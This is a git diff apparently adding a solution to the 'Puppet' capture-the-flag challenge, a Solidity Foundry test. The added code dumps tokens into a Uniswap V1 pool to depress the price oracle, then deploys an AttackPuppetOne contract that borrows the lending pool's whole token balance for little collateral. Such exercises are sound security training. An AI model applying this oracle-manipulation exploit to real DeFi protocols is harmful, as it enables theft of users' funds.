@@ -92,7 +92,20 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
+        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV1Exchange.tokenToEthSwapInput(
+            PLAYER_INITIAL_TOKEN_BALANCE, 
+            1, 
+            block.timestamp + 1000
+        );
+
+        uint256 amountToDepositAfterSwap = 19664329888798200000;
         
+        new AttackPuppetOne(
+            address(lendingPool),
+            address(token),
+            address(uniswapV1Exchange)
+        ).attack{value: amountToDepositAfterSwap}(recovery);
     }
 
     // Utility function to calculate Uniswap prices
@@ -114,5 +127,24 @@ contract PuppetChallenge is Test {
         // All tokens of the lending pool were deposited into the recovery account
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract AttackPuppetOne {
+    DamnValuableToken token;
+    IUniswapV1Exchange uniswapV1Exchange;
+    PuppetPool puppetPool;
+
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+    uint256 public constant DEPOSIT_FACTOR = 2;
+
+    constructor(address puppetPoolAddress, address tokenAddress, address uniswapV1ExchangeAddress) {
+        token = DamnValuableToken(tokenAddress);
+        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1ExchangeAddress);
+        puppetPool = PuppetPool(puppetPoolAddress);
+    }
+
+    function attack(address receiver) payable external {
+        puppetPool.borrow{value: 19664329888798200000}(POOL_INITIAL_TOKEN_BALANCE, receiver);
     }
 }
